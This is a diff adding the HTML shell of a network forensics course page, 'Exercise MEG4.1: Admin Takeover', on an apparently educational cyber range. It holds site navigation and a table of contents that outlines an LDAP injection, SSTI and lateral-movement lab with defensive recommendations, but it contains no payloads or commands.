@@ -1,0 +1,2820 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise MEG4.1: Admin Takeover - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-meg41-admin-takeover" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise MEG4.1: Admin Takeover
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#engagement-status" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Engagement Status
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-progress" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag Progress
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-the-four-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: The Four Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: The Four Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#server-side-template-injection-ssti" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-Side Template Injection (SSTI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lateral-movement-via-credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement via Credential Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#postgresql-one-liners" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PostgreSQL One-Liners
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer-ldap-query-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer: LDAP Query Syntax
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer-jinja2-ssti-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer: Jinja2 SSTI Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-ldap-injection-bypassing-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 1: LDAP Injection - Bypassing Authentication
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phase 1: LDAP Injection - Bypassing Authentication">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-launch-the-exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Launch the Exercise
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-configure-host-resolution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Configure Host Resolution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-explore-the-admin-portal-login-page" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Explore the Admin Portal Login Page
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-attempt-authentication-with-a-known-username" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Attempt Authentication with a Known Username
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-attempt-authentication-with-a-nonexistent-username" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Attempt Authentication with a Nonexistent Username
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-exploit-ldap-wildcard-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Exploit LDAP Wildcard Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-verify-authenticated-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Verify Authenticated Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-8-enumerate-the-admin-dashboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 8: Enumerate the Admin Dashboard
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-server-side-template-injection-ssti" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 2: Server-Side Template Injection (SSTI)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phase 2: Server-Side Template Injection (SSTI)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-9-understand-the-report-generator-interface" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 9: Understand the Report Generator Interface
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-10-submit-a-normal-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 10: Submit a Normal Report
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-11-test-for-ssti-with-a-mathematical-expression" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 11: Test for SSTI with a Mathematical Expression
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-12-confirm-ssti-with-string-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 12: Confirm SSTI with String Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-13-enumerate-available-objects" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 13: Enumerate Available Objects
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-14-test-command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 14: Test Command Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-15-explore-the-server-filesystem" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 15: Explore the Server Filesystem
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 3: Credential Discovery
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phase 3: Credential Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-16-read-all-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 16: Read All Environment Variables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-17-access-environment-variables-through-python-objects" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 17: Access Environment Variables Through Python Objects
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-18-read-configuration-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 18: Read Configuration Files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-19-verify-database-connectivity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 19: Verify Database Connectivity
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-20-check-for-psql-client" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 20: Check for psql Client
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-lateral-movement-to-the-engineering-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 4: Lateral Movement to the Engineering Database
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phase 4: Lateral Movement to the Engineering Database">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-21-connect-to-the-engineering-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 21: Connect to the Engineering Database
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-22-enumerate-table-schemas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 22: Enumerate Table Schemas
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-23-query-for-the-master-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 23: Query for the Master Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-24-extract-additional-intelligence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 24: Extract Additional Intelligence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-25-verify-network-position" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 25: Verify Network Position
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-26-document-and-submit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 26: Document and Submit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#complete-attack-chain-diagram" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Complete Attack Chain Diagram
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defensive-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defensive Recommendations
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defensive Recommendations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#immediate-actions-fix-within-24-hours" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Immediate Actions (Fix Within 24 Hours)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-term-actions-fix-within-1-week" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Short-Term Actions (Fix Within 1 Week)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#long-term-actions-fix-within-1-month" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Long-Term Actions (Fix Within 1 Month)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
